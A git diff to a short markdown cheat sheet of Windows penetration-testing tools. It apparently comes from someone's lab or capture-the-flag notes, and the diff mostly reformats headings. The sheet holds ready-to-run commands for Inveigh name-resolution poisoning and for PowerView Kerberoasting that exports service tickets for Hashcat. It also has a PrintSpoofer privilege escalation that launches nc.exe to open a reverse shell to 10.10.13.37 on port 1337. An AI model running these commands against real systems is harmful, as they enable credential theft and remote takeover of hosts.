@@ -1,6 +1,6 @@
 # tools
 
-Inveigh.ps1
+## Inveigh.ps1
 https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1
 Similar to Responder, for powershell
 PS C:\> Import-Module .\Inveigh.ps1
@@ -8,7 +8,7 @@ PS C:\> (Get-Command Invoke-Inveigh).Parameters
 PS C:\> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
 
 
-PowerView.ps1
+# PowerView.ps1
 https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
 Replacements for various Windows net*
 PS C:\> import-module .\PowerView.ps1
@@ -17,13 +17,12 @@ PS C:\> Get-DomainUser * -spn | select samaccountname  #to extract TGS tickets
 PS C:\> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\all_tickets.csv -NoTypeInformation  #export to csv
 
 
-nc.exe
+### nc.exe
 https://github.com/int0x33/nc.exe/
 netcat Win binary, for port listening and reverse shell 
 
 
-
-printspoofer
+#### printspoofer
 To escalate with SeImpersonatePrivilege & SeAssignPrimaryTokenPrivilege
 PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
 
